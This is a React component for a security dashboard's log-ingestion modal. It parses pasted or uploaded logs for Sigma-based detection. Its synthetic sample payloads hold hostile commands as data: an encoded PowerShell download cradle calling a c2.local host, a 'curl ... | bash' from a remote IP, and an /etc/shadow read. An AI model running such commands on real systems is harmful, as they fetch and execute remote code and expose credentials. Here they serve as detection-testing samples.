"use client"

import { useState } from "react"
import { useSWRConfig } from "swr"
import {
  Upload,
  FileCode,
  CheckCircle2,
  AlertCircle,
  Loader2,
  X,
  Database,
  Sparkles,
  ArrowRight,
} from "lucide-react"
import { ingestRawLogs, ingestLogFile, type IngestResponse } from "@/lib/api"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"

const SAMPLE_PAYLOADS: Record<string, { desc: string; raw: string }> = {
  sysmon: {
    desc: "Sysmon EID 1: Suspicious PowerShell execution",
    raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
    <EventRecordID>10042</EventRecordID>
    <TimeCreated SystemTime="2026-01-15T02:40:12.123456Z"/>
    <Computer>win-srv-secops</Computer>
  </System>
  <EventData>
    <Data Name="UtcTime">2026-01-15 02:40:12.123</Data>
    <Data Name="ProcessId">4104</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbABvAGMAYQBsAC8AcAAuAHAAczAxACcAKQA=</Data>
    <Data Name="User">CORP\\victim_admin</Data>
    <Data Name="ParentProcessId">2104</Data>
    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
  </EventData>
</Event>`,
  },
  auditd_execve: {
    desc: "Linux auditd EXECVE: Suspicious bash pipeline",
    raw: JSON.stringify(
      {
        type: "EXECVE",
        msg: "audit(1705284000.123:8801)",
        argc: 3,
        a0: "/bin/bash",
        a1: "-c",
        a2: "curl -s http://198.51.100.45/p | bash",
        exe: "/bin/bash",
        auid: "1000",
        uid: "0",
        host: "target-linux-01",
      },
      null,
      2,
    ),
  },
  auditd_file: {
    desc: "Linux auditd File Watch: /etc/shadow credential access",
    raw: JSON.stringify(
      {
        type: "PATH",
        msg: "audit(1705284010.456:8802)",
        path: "/etc/shadow",
        nametype: "NORMAL",
        cwd: "/root",
        exe: "/bin/cat",
        uid: "0",
        key: "cred_access",
        host: "target-linux-01",
      },
      null,
      2,
    ),
  },
  ssh_auth: {
    desc: "OpenSSH syslog: Failed brute force followed by accepted login",
    raw: `Jan 15 02:10:01 edge-fw-01 sshd[9101]: Failed password for invalid user root from 203.0.113.195 port 44100 ssh2
Jan 15 02:10:04 edge-fw-01 sshd[9102]: Failed password for invalid user admin from 203.0.113.195 port 44102 ssh2
Jan 15 02:10:09 edge-fw-01 sshd[9103]: Accepted password for sysops from 203.0.113.195 port 44104 ssh2`,
  },
  zeek_conn: {
    desc: "Zeek conn.log: C2 outbound TLS beacon session",
    raw: JSON.stringify(
      {
        ts: "1705284020.789",
        uid: "C_c2_beacon_99",
        "id.orig_h": "192.168.1.105",
        "id.orig_p": 51234,
        "id.resp_h": "203.0.113.195",
        "id.resp_p": 443,
        proto: "tcp",
        service: "ssl",
        conn_state: "SF",
        orig_bytes: 4500,
        resp_bytes: 18200,
        host: "perimeter-gw",
      },
      null,
      2,
    ),
  },
}

interface LogIngestionModalProps {
  open: boolean
  onClose: () => void
  onSelectIncident?: (incidentId: string) => void
}

export function LogIngestionModal({ open, onClose, onSelectIncident }: LogIngestionModalProps) {
  const { mutate } = useSWRConfig()
  const [sourceType, setSourceType] = useState<string>("sysmon")
  const [siteId, setSiteId] = useState<string>("site-01")
  const [inputMode, setInputMode] = useState<"text" | "file">("text")
  const [rawText, setRawText] = useState<string>(SAMPLE_PAYLOADS.sysmon.raw)
  const [selectedFile, setSelectedFile] = useState<File | null>(null)
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState<IngestResponse | null>(null)
  const [errorMsg, setErrorMsg] = useState<string | null>(null)

  if (!open) return null

  function handleTypeChange(newType: string) {
    setSourceType(newType)
    if (SAMPLE_PAYLOADS[newType]) {
      setRawText(SAMPLE_PAYLOADS[newType].raw)
    }
  }

  function handleLoadSample() {
    if (SAMPLE_PAYLOADS[sourceType]) {
      setRawText(SAMPLE_PAYLOADS[sourceType].raw)
      setErrorMsg(null)
    }
  }

  async function handleIngest() {
    setLoading(true)
    setErrorMsg(null)
    setResult(null)

    try {
      let res: IngestResponse

      if (inputMode === "file") {
        if (!selectedFile) {
          setErrorMsg("Please select a file to upload.")
          setLoading(false)
          return
        }
        res = await ingestLogFile(selectedFile, sourceType, siteId)
      } else {
        if (!rawText.trim()) {
          setErrorMsg("Please enter or paste raw log data.")
          setLoading(false)
          return
        }

        let records: unknown[] = []
        if (sourceType === "sysmon") {
          records = [rawText]
        } else if (sourceType === "ssh_auth") {
          records = rawText.split("\n").map((l) => l.trim()).filter(Boolean)
        } else {
          try {
            const parsed = JSON.parse(rawText)
            records = Array.isArray(parsed) ? parsed : [parsed]
          } catch {
            records = rawText.split("\n").map((l) => l.trim()).filter(Boolean)
          }
        }

        res = await ingestRawLogs({
          source_type: sourceType,
          records,
          site_id: siteId,
        })
      }

      setResult(res)

      // Refresh dashboard datasets
      mutate("incidents")
      mutate("metrics")
      mutate(["telemetry", 80])
      mutate(["telemetry", 60])
    } catch (err: unknown) {
      setErrorMsg(err instanceof Error ? err.message : String(err))
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 backdrop-blur-sm p-4">
      <div
        className="w-full max-w-2xl rounded-lg border border-[rgba(0,240,255,0.3)] bg-[#0a0f1d] p-6 shadow-2xl"
        style={{
          boxShadow: "0 0 30px rgba(0,240,255,0.15), inset 0 1px 0 rgba(255,255,255,0.08)",
        }}
      >
        {/* Header */}
        <div className="flex items-center justify-between border-b border-[rgba(0,240,255,0.15)] pb-3">
          <div className="flex items-center gap-2">
            <div className="flex h-7 w-7 items-center justify-center rounded border border-[rgba(0,240,255,0.4)] bg-[rgba(0,240,255,0.1)]">
              <Database className="h-4 w-4 text-[#00f0ff]" />
            </div>
            <div>
              <h2 className="font-mono text-sm font-bold tracking-wider text-[#00f0ff]">
                FORENSIC LOG INGESTION
              </h2>
              <p className="font-mono text-[10px] text-[#849495]">
                NORMALIZE INTO OCSF &bull; DETECT WITH SIGMA &bull; BUILD LIVE ATTACK GRAPH
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="rounded p-1 text-[#849495] hover:bg-white/5 hover:text-white"
          >
            <X className="h-4 w-4" />
          </button>
        </div>

        {/* Form Body */}
        <div className="mt-4 space-y-4">
          {/* Row 1: Source Type + Site ID */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <div>
              <label className="block font-mono text-[10px] uppercase text-[#849495] mb-1">
                Log Source Parser
              </label>
              <select
                value={sourceType}
                onChange={(e) => handleTypeChange(e.target.value)}
                className="w-full rounded border border-[rgba(0,240,255,0.2)] bg-[#05070d] px-2.5 py-1.5 font-mono text-xs text-[#00f0ff] focus:border-[#00f0ff] focus:outline-none"
              >
                <option value="sysmon">Windows Sysmon EID 1 (Process Creation)</option>
                <option value="auditd_execve">Linux auditd EXECVE (Process Exec)</option>
                <option value="auditd_file">Linux auditd File Watch (/etc/shadow)</option>
                <option value="ssh_auth">OpenSSH Syslog (auth.log)</option>
                <option value="zeek_conn">Zeek Network Log (conn.log)</option>
              </select>
            </div>

            <div>
              <label className="block font-mono text-[10px] uppercase text-[#849495] mb-1">
                Telemetry Site ID
              </label>
              <input
                type="text"
                value={siteId}
                onChange={(e) => setSiteId(e.target.value)}
                placeholder="e.g. site-01"
                className="w-full rounded border border-[rgba(0,240,255,0.2)] bg-[#05070d] px-2.5 py-1.5 font-mono text-xs text-[#e1e2ec] focus:border-[#00f0ff] focus:outline-none"
              />
            </div>
          </div>

          {/* Mode Tabs */}
          <div className="flex items-center justify-between border-b border-[rgba(0,240,255,0.1)] pb-2">
            <div className="flex gap-2">
              <button
                type="button"
                onClick={() => setInputMode("text")}
                className={`font-mono text-[11px] px-2.5 py-1 rounded transition-colors ${
                  inputMode === "text"
                    ? "bg-[rgba(0,240,255,0.15)] text-[#00f0ff] border border-[rgba(0,240,255,0.3)]"
                    : "text-[#849495] hover:text-[#e1e2ec]"
                }`}
              >
                PASTE RAW LOG
              </button>
              <button
                type="button"
                onClick={() => setInputMode("file")}
                className={`font-mono text-[11px] px-2.5 py-1 rounded transition-colors ${
                  inputMode === "file"
                    ? "bg-[rgba(0,240,255,0.15)] text-[#00f0ff] border border-[rgba(0,240,255,0.3)]"
                    : "text-[#849495] hover:text-[#e1e2ec]"
                }`}
              >
                UPLOAD LOG FILE
              </button>
            </div>

            {inputMode === "text" && (
              <Button
                variant="ghost"
                size="sm"
                onClick={handleLoadSample}
                className="h-6 font-mono text-[10px] text-[#00e5a3] hover:text-[#00e5a3] hover:bg-[rgba(0,229,163,0.1)]"
              >
                <Sparkles className="h-3 w-3 mr-1" />
                LOAD SAMPLE
              </Button>
            )}
          </div>

          {/* Input Area */}
          {inputMode === "text" ? (
            <div className="relative">
              {rawText === SAMPLE_PAYLOADS[sourceType]?.raw && (
                <div className="absolute top-2 right-2 pointer-events-none z-10">
                  <Badge variant="outline" className="font-mono text-[9px] border-[#ffb020] text-[#ffb020] bg-[#05070d]/80">
                    SYNTHETIC SAMPLE
                  </Badge>
                </div>
              )}
              <textarea
                value={rawText}
                onChange={(e) => setRawText(e.target.value)}
                rows={7}
                placeholder="Paste raw log lines, XML, or JSON records here..."
                className="w-full rounded border border-[rgba(0,240,255,0.2)] bg-[#05070d] p-2.5 font-mono text-[11px] text-[#e1e2ec] focus:border-[#00f0ff] focus:outline-none resize-none leading-relaxed"
              />
              <p className="mt-1 font-mono text-[9px] text-[#849495]">
                {SAMPLE_PAYLOADS[sourceType]?.desc}
              </p>
            </div>
          ) : (
            <div className="flex flex-col items-center justify-center rounded border-2 border-dashed border-[rgba(0,240,255,0.25)] bg-[#05070d] p-6 text-center">
              <Upload className="h-8 w-8 text-[#00f0ff] mb-2 opacity-70" />
              <p className="font-mono text-xs text-[#e1e2ec] mb-1">
                {selectedFile ? selectedFile.name : "Select or drag a log file"}
              </p>
              <p className="font-mono text-[10px] text-[#849495] mb-3">
                Supports Sysmon XML/JSON, auditd log files, syslog auth.log, or Zeek TSV
              </p>
              <input
                type="file"
                id="file-input"
                className="hidden"
                onChange={(e) => setSelectedFile(e.target.files?.[0] ?? null)}
              />
              <label
                htmlFor="file-input"
                className="cursor-pointer rounded border border-[rgba(0,240,255,0.3)] bg-[rgba(0,240,255,0.1)] px-3 py-1 font-mono text-[11px] text-[#00f0ff] hover:bg-[rgba(0,240,255,0.2)]"
              >
                Browse Files
              </label>
            </div>
          )}

          {/* Error Message */}
          {errorMsg && (
            <div className="flex items-center gap-2 rounded border border-[rgba(255,0,85,0.4)] bg-[rgba(255,0,85,0.1)] p-2.5 font-mono text-xs text-[#ff0055]">
              <AlertCircle className="h-4 w-4 shrink-0" />
              <span>{errorMsg}</span>
            </div>
          )}

          {/* Result Card */}
          {result && (
            <div className="rounded border border-[rgba(0,229,163,0.3)] bg-[rgba(0,229,163,0.06)] p-3 space-y-2">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <CheckCircle2 className="h-4 w-4 text-[#00e5a3]" />
                  <span className="font-mono text-xs font-semibold text-[#00e5a3]">
                    INGESTION SUCCESSFUL (source=&quot;live&quot;)
                  </span>
                </div>
                <Badge
                  variant="outline"
                  className="font-mono text-[9px] border-[#00e5a3] text-[#00e5a3]"
                >
                  LIVE PIPELINE
                </Badge>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 font-mono text-[10px]">
                <div className="rounded bg-[#05070d]/60 p-2">
                  <div className="text-[#849495]">INGESTED</div>
                  <div className="text-sm font-bold text-[#00f0ff]">{result.ingested}</div>
                </div>
                <div className="rounded bg-[#05070d]/60 p-2">
                  <div className="text-[#849495]">DUPLICATES</div>
                  <div className="text-sm font-bold text-[#849495]">{result.duplicates}</div>
                </div>
                <div className="rounded bg-[#05070d]/60 p-2">
                  <div className="text-[#849495]">ERRORS</div>
                  <div className="text-sm font-bold text-[#ffb020]">{result.errors.length}</div>
                </div>
                <div className="rounded bg-[#05070d]/60 p-2">
                  <div className="text-[#849495]">INCIDENT</div>
                  <div className="text-xs font-bold text-[#00e5a3] truncate">
                    {result.incident_id ?? "No rule triggered"}
                  </div>
                </div>
              </div>

              {result.incident_id && onSelectIncident && (
                <div className="pt-1">
                  <Button
                    size="sm"
                    onClick={() => {
                      onSelectIncident(result.incident_id!)
                      onClose()
                    }}
                    className="w-full h-7 font-mono text-[11px] bg-[rgba(0,240,255,0.2)] text-[#00f0ff] border border-[rgba(0,240,255,0.4)] hover:bg-[rgba(0,240,255,0.3)]"
                  >
                    <span>OPEN GENERATED INCIDENT ({result.incident_id})</span>
                    <ArrowRight className="h-3.5 w-3.5 ml-1.5" />
                  </Button>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Footer Actions */}
        <div className="mt-5 flex items-center justify-end gap-2 border-t border-[rgba(0,240,255,0.12)] pt-3">
          <Button
            variant="outline"
            size="sm"
            onClick={onClose}
            className="font-mono text-xs border-[rgba(0,240,255,0.2)] text-[#849495] hover:text-[#e1e2ec]"
          >
            CLOSE
          </Button>
          <Button
            size="sm"
            disabled={loading}
            onClick={handleIngest}
            className="font-mono text-xs bg-[#00f0ff] text-[#080c14] hover:bg-[#00f0ff]/80 font-bold"
          >
            {loading ? (
              <>
                <Loader2 className="h-3.5 w-3.5 mr-1.5 animate-spin" />
                INGESTING...
              </>
            ) : (
              <>
                <Upload className="h-3.5 w-3.5 mr-1.5" />
                EXECUTE INGESTION
              </>
            )}
          </Button>
        </div>
      </div>
    </div>
  )
}
